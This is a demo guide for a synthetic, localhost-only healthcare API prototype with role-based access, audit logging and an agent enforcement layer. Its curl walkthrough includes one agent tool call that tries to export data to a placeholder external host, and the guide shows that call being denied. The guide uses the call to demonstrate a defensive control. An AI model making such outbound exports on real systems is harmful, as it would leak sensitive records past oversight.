# Demo Guide — MedIntel Nexus Round 1 Prototype

**Reproducible in ~10 minutes on a laptop. Zero cost, zero third-party dependencies, no
API keys, no internet required after cloning.**

> **SYNTHETIC DEMO.** All data is generated, all personas are fictional, all thresholds
> are illustrative. Nothing here is a live hospital integration.

---

## 1. Requirements

| Requirement | Version used in our run |
|---|---|
| Node.js | v24.19.0 (works on ≥ 18) |
| npm | 12.0.2 (optional — only for `npm test` convenience scripts) |
| Anything else | None. The prototype uses only the Node standard library. |

## 2. Install and verify

```bash
git clone https://github.com/harsha-vardhan-2006/jatayu.git
cd jatayu/prototype
npm test          # runs node --test "test/*.test.js"
```

Expected: `25 pass, 0 fail`.

## 3. Run the API

```bash
npm start         # = node src/server.js, listens on http://127.0.0.1:4173
# or: PORT=8080 node src/server.js
```

You should see:

```
MedIntel Nexus demo listening on http://127.0.0.1:4173
SYNTHETIC DEMO - no real patient data. Demo logins are in docs/DEMO_GUIDE.md
```

## 4. Demo logins (synthetic, localhost-only)

| Role | Username | Password |
|---|---|---|
| Doctor (assigned to SYN-P-0042, SYN-P-0043) | `doctor-demo` | `demo-only-doctor` |
| Nurse (assigned to SYN-P-0042) | `nurse-demo` | `demo-only-nurse` |
| Administrator (no clinical access) | `admin-demo` | `demo-only-admin` |

These are obviously-fake demo credentials for a local synthetic system, not secrets —
see `docs/validation/KNOWN_LIMITATIONS.md` (L-05).

## 5. Try it with curl (the whole story in 5 commands)

```bash
# 1. Log in as the doctor
TOKEN=$(curl -s -X POST http://127.0.0.1:4173/api/login \
  -H 'content-type: application/json' \
  -d '{"username":"doctor-demo","password":"demo-only-doctor"}' \
  | sed -n 's/.*"token": "\([^"]*\)".*/\1/p')

# 2. Read an assigned patient's timeline (allowed)
curl -s http://127.0.0.1:4173/api/patients/SYN-P-0042/timeline \
  -H "authorization: Bearer $TOKEN"

# 3. Read an UNassigned patient (denied, and audited)
curl -s http://127.0.0.1:4173/api/patients/SYN-P-0044/timeline \
  -H "authorization: Bearer $TOKEN"
# -> 403 {"error":"forbidden","reason":"no_patient_assignment"}

# 4. Agent attempts an outbound export (denied by the Agent Trust Layer)
curl -s -X POST http://127.0.0.1:4173/api/agents/SYN-AGENT-01/invoke \
  -H 'x-agent-id: SYN-AGENT-01' -H 'content-type: application/json' \
  -d '{"tool":"egress.export","args":{"destination":"https://external-collector.example"}}'
# -> 403 {"denied":true,"reason":"egress_not_granted"}

# 5. Log in as the admin and read the audit log (admin-only)
ADMIN=$(curl -s -X POST http://127.0.0.1:4173/api/login \
  -H 'content-type: application/json' \
  -d '{"username":"admin-demo","password":"demo-only-admin"}' \
  | sed -n 's/.*"token": "\([^"]*\)".*/\1/p')
curl -s http://127.0.0.1:4173/api/audit -H "authorization: Bearer $ADMIN"
```

## 6. API reference (Round 1 surface)

| Method & path | Who | Purpose |
|---|---|---|
| `POST /api/login` | anyone | Issue a session token |
| `GET /api/me` | authenticated | Current principal + assigned patients |
| `GET /api/patients` | authenticated | Patients visible to this principal (empty for admin) |
| `GET /api/patients/:id/timeline` | clinical, assigned | Longitudinal timeline |
| `GET /api/patients/:id/vitals` | clinical, assigned | Observations with quality verdicts + quarantined list |
| `POST /api/patients/:id/observations` | clinical, assigned | Submit an observation through the quality gate |
| `POST /api/patients/:id/suggestions` | doctor, assigned | Generate a supervised CDS suggestion |
| `POST /api/suggestions/:id/decision` | doctor, assigned | Record the clinician's review decision |
| `POST /api/patients/:id/amendments` | doctor, assigned | Amend a record with provenance |
| `POST /api/agents/:id/invoke` | agent (`x-agent-id`) | Agent tool call at the enforcement boundary |
| `GET /api/audit` | admin | Append-only audit log |
| `GET /api/stream/:id` | clinical, assigned | Server-Sent Events live observation stream |

## 7. Troubleshooting

| Symptom | Cause / fix |
|---|---|
| `EADDRINUSE` | Another process holds the port — use `PORT=8080 npm start` |
| `401 authentication_required` | Missing/expired `Authorization: Bearer <token>` |
| Tests fail with `MODULE_NOT_FOUND` | Run them from inside `prototype/` |
| Stream test hangs | Ensure nothing else is bound to the test port; the suite uses ephemeral ports |

## 8. Cleaning up

The demo writes nothing outside the process: stop the server (`Ctrl+C`) and, if you
logged in, tokens vanish with the process. No files, no database to remove.
